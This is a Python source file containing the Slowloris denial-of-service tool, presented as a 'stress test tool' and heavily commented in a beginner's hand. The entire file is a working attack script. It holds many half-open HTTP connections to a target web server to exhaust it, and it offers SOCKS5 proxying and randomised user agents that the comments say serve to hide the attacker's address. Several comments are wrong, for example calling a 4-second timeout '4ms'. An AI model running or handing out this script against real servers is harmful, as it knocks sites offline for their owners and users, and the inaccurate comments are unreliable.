#!/usr/bin/env python3
import argparse
import logging
import random
import socket
import sys
import time

# getting the server
parser = argparse.ArgumentParser(
    description="Slowloris, low bandwidth stress test tool for websites"
)
parser.add_argument("host", nargs="?", help="Host to perform stress test on")
parser.add_argument(
    "-p", "--port", default=80, help="Port of webserver, usually 80", type=int
)

# -s (number of sockets) is the number of sockets used
parser.add_argument(
    "-s",
    "--sockets",
    default=150,
    help="Number of sockets to use in the test",
    type=int,
)

# key logging
parser.add_argument(
    "-v", "--verbose", dest="verbose", action="store_true", help="Increases logging"
)
# makes use of different sockets to then not have it all come from the same address
parser.add_argument(
    "-ua",
    "--randuseragents",
    dest="randuseragent",
    action="store_true",
    help="Randomizes user-agents with each request",
)
# -x uses SOCKS5 for connection 
parser.add_argument(
    "-x",
    "--useproxy",
    dest="useproxy",
    action="store_true",
    help="Use a SOCKS5 proxy for connecting",
)
# --proxy-host sets up proxy to send files through to not show ip address
parser.add_argument("--proxy-host", default="127.0.0.1", help="SOCKS5 proxy host")
# defualting thr port for 8080
parser.add_argument("--proxy-port", default="8080", help="SOCKS5 proxy port", type=int)
#uses the HTTPS for the requests storing the true values
parser.add_argument(
    "--https", dest="https", action="store_true", help="Use HTTPS for the requests"
)
#changing the time bettween the packets sent
parser.add_argument(
    "--sleeptime",
    dest="sleeptime",
    default=15,
    type=int,
    help="Time to sleep between each header sent.",
)
# sets the defaults for the defined variables
parser.set_defaults(verbose=False)
parser.set_defaults(randuseragent=False)
parser.set_defaults(useproxy=False)
parser.set_defaults(https=False)
args = parser.parse_args()
# giving out the nlength of the parser
if len(sys.argv) <= 1:
    parser.print_help()
    sys.exit(1)
# checks for a host 
if not args.host:
    print("Host required!")
    parser.print_help()
    sys.exit(1)

if args.useproxy:
    # Tries to import to external "socks" library
    # and monkey patches socket.socket to connect over
    # the proxy by default
    try:
        import socks

        socks.setdefaultproxy(socks.PROXY_TYPE_SOCKS5, args.proxy_host, args.proxy_port)
        socket.socket = socks.socksocket
        logging.info("Using SOCKS5 proxy for connecting...")
    except ImportError:
        logging.error("Socks Proxy Library Not Available!")
# logging the information retreived
if args.verbose:
    logging.basicConfig(
        format="[%(asctime)s] %(message)s", # format
        datefmt="%d-%m-%Y %H:%M:%S", # date format
        level=logging.DEBUG, # logging level for debugging
    )
else:
    logging.basicConfig(
        format="[%(asctime)s] %(message)s",
        datefmt="%d-%m-%Y %H:%M:%S",
        level=logging.INFO, # logging level for Info
    )
# imports ssl module
if args.https:
    logging.info("Importing ssl module")
    import ssl
# the list of sockets used
list_of_sockets = []
# list of user agents to determine the information of a user, making the users look like they come from different places
user_agents = [
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/53.0.2785.143 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/54.0.2840.71 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_6) AppleWebKit/602.1.50 (KHTML, like Gecko) Version/10.0 Safari/602.1.50",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.11; rv:49.0) Gecko/20100101 Firefox/49.0",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/53.0.2785.143 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/54.0.2840.71 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/54.0.2840.71 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_1) AppleWebKit/602.2.14 (KHTML, like Gecko) Version/10.0.1 Safari/602.2.14",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12) AppleWebKit/602.1.50 (KHTML, like Gecko) Version/10.0 Safari/602.1.50",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.79 Safari/537.36 Edge/14.14393"
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/53.0.2785.143 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/54.0.2840.71 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/53.0.2785.143 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/54.0.2840.71 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; WOW64; rv:49.0) Gecko/20100101 Firefox/49.0",
    "Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/53.0.2785.143 Safari/537.36",
    "Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/54.0.2840.71 Safari/537.36",
    "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/53.0.2785.143 Safari/537.36",
    "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/54.0.2840.71 Safari/537.36",
    "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:49.0) Gecko/20100101 Firefox/49.0",
    "Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko",
    "Mozilla/5.0 (Windows NT 6.3; rv:36.0) Gecko/20100101 Firefox/36.0",
    "Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/53.0.2785.143 Safari/537.36",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/53.0.2785.143 Safari/537.36",
    "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:49.0) Gecko/20100101 Firefox/49.0",
]

# initialising the socket with the ip address
def init_socket(ip):
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.settimeout(4) # time out is 4ms
    if args.https: # wrap sockets is defining a socket
        s = ssl.wrap_socket(s)
    # connecting to the portr and ip that has been given
    s.connect((ip, args.port))
    # sending random user agents and stating that it accepts english as a language
    s.send("GET /?{} HTTP/1.1\r\n".format(random.randint(0, 2000)).encode("utf-8"))
    if args.randuseragent:
        s.send("User-Agent: {}\r\n".format(random.choice(user_agents)).encode("utf-8"))
    else:
        s.send("User-Agent: {}\r\n".format(user_agents[0]).encode("utf-8"))
    s.send("{}\r\n".format("Accept-language: en-US,en,q=0.5").encode("utf-8"))
    return s

# main body of the code
def main():
    ip = args.host # ip address of the host
    socket_count = args.sockets # gets the number of sockets
    logging.info("Attacking %s with %s sockets.", ip, socket_count) # logs the information
    #creating the socket
    logging.info("Creating sockets...")
    #for loop for the range of sockets
    for _ in range(socket_count):
        try:
            # tries to output the socket number
            logging.debug("Creating socket nr %s", _)
            s = init_socket(ip)
        except socket.error as e:
            # getting the error exceptions for the non reachable/ non created sockets
            logging.debug(e)
            break
        list_of_sockets.append(s)
    # while there is a socket this occuers
    while True:
        try:
            # logs the information of the socket
            logging.info(
                "Sending keep-alive headers... Socket count: %s", len(list_of_sockets)
            )
            # for every s count up until it hits the number of sockets in the list
            for s in list(list_of_sockets):
                try:
                    # sending random encoded number
                    s.send(
                        "X-a: {}\r\n".format(random.randint(1, 5000)).encode("utf-8")
                    )
                except socket.error:
                    list_of_sockets.remove(s) # removes s from the list of sockets
            #for the range of sockets log the recreation of the socket 
            for _ in range(socket_count - len(list_of_sockets)):
                logging.debug("Recreating socket...")
                try:
                    s = init_socket(ip) #initialising the ip of the socket
                    if s:
                        list_of_sockets.append(s) # adds the socket back into the list
                except socket.error as e:
                    logging.debug(e) # debug error
                    break
            # pasing for the number of time specified in --sleeptime
            logging.debug("Sleeping for %d seconds", args.sleeptime)
            time.sleep(args.sleeptime)
        #exiting exception for slowloris (cntrl z)
        except (KeyboardInterrupt, SystemExit):
            logging.info("Stopping Slowloris")
            break

# runs the main code
if __name__ == "__main__":
    main()